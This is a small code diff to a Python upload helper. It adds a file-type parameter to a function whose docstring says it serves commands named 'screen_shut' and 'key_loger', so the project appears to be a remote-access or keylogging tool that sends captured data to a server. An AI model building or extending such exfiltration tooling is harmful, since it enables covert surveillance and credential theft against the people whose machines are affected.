@@ -305,7 +305,7 @@ def conver_json_to_dict(json_data: json) -> dict:
     return json.loads(json_data)
 
 
-def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200):
+def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200, file_type: str = 'zip'):
     # time_out 1200: 20 min
     '''api for upload zip file and return download link \n
     this use in commands: import_file, screen_shut, key_loger,.. \n
@@ -352,7 +352,7 @@ def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200):
         finalise_headers = {
             'fuid': FUID,
             'file_name': file_name,
-            'file_type': 'zip',
+            'file_type': file_type,
             'total_chunks': 1
         }
 
